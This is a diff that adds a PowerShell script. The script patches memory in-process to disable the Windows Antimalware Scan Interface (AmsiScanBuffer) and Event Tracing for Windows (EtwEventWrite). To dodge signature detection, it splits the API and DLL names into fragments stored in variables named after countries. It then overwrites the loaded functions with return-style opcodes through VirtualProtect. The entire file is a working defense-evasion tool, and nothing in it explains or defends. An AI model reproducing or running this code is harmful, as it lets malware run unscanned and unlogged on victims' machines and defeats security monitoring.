@@ -1,0 +1,90 @@
+function getAustriaType {
+    Param (
+        [Parameter(Position=0, Mandatory=$True)]
+        [Type[]]$USA,
+        
+        [Parameter(Position=1)]
+        [Type]$Germany = [Void]
+    )
+
+    $India = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
+        'MyDelegateType', 
+        'Class,Public,Sealed,AnsiClass,AutoClass', 
+        [System.MulticastDelegate]
+    )
+    
+    $India.DefineConstructor(
+        'RTSpecialName,HideBySig,Public', 
+        [System.Reflection.CallingConventions]::Standard, 
+        $USA
+    ).SetImplementationFlags('Runtime,Managed')
+    
+    $India.DefineMethod(
+        'Invoke',
+        'Public,HideBySig,NewSlot,Virtual',
+        $Germany, 
+        $USA
+    ).SetImplementationFlags('Runtime,Managed')
+    
+    return $India.CreateType()
+}
+
+
+$China=@"
+using System;
+using System.Runtime.InteropServices;
+public class APIs {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+}
+"@
+Add-Type $China
+
+$Canada="A"
+$Mexico="msiS"
+$Brazil="canB"
+$Spain="uf"
+$Italy="fer"
+$France="am"
+$Russia="si"
+$Japan=".dll"
+
+$Egypt="Et"
+$Turkey="wEve"
+$Greece="ntWri"
+$Ukraine="te"
+
+$Poland="ntd"
+$Sweden="ll"
+$Norway=".dll"
+
+$SouthKorea=[APIs]::LoadLibrary($France+$Russia+$Japan)
+$Australia=[APIs]::GetProcAddress($SouthKorea,$Canada+$Mexico+$Brazil+$Spain+$Italy)
+$Finland=[APIs]::LoadLibrary($Poland+$Sweden+$Norway)
+$Denmark=[APIs]::GetProcAddress($Finland,$Egypt+$Turkey+$Greece+$Ukraine)
+$oldProtectionBuffer=0
+$kernel=[APIs]::LoadLibrary("kern"+"el"+"32"+".dl"+"l")
+$shield=[APIs]::GetProcAddress($kernel,"Vir"+"tualPr"+"ote"+"ct")
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shield,(getAustriaType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType())([Bool])))
+
+#A.S.B Patch
+$offset=$Australia.ToInt64()+27
+$Australia=New-Object system.Intptr -ArgumentList $offset
+$vp.Invoke($Australia,3,0x40,[ref]$oldProtectionBuffer)
+$buf=[Byte[]](0x48,0x31,0xFF)
+[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$Australia,3)
+$vp.Invoke($Australia,3,0x20,[ref]$oldProtectionBuffer)
+
+#E.T.W Patch
+$oldProtectionBuffer=0
+$offset=$Denmark.ToInt64()+4
+$Denmark=New-Object system.Intptr -ArgumentList $offset
+$vp.Invoke($Denmark,3,0x40,[ref]$oldProtectionBuffer)
+$buf=[Byte[]](0x48,0x31,0xC0,0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$Denmark,4)
+$vp.Invoke($Denmark,3,0x20,[ref]$oldProtectionBuffer)
